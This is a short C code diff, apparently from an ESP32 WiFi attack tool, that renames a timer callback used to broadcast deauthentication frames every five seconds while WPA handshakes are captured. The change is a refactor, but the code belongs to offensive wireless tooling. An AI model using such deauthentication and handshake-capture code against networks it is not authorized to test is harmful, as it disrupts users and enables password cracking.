@@ -28,13 +28,13 @@ static void handshake_capture_handler(void *args, esp_event_base_t event_base, i
     attack_append_status_content(frame->payload, frame->rx_ctrl.sig_len);
 }
 
-static void send_deauth_frame(void* arg){
+static void timer_send_deauth_frame(void* arg){
     deauther_send_deauth_frame(ap_record);
 }
 
 static void attack_handshake_method_broadcast(){
     const esp_timer_create_args_t deauth_timer_args = {
-        .callback = &send_deauth_frame
+        .callback = &timer_send_deauth_frame
     };
     ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
     ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 5 * 1000000));
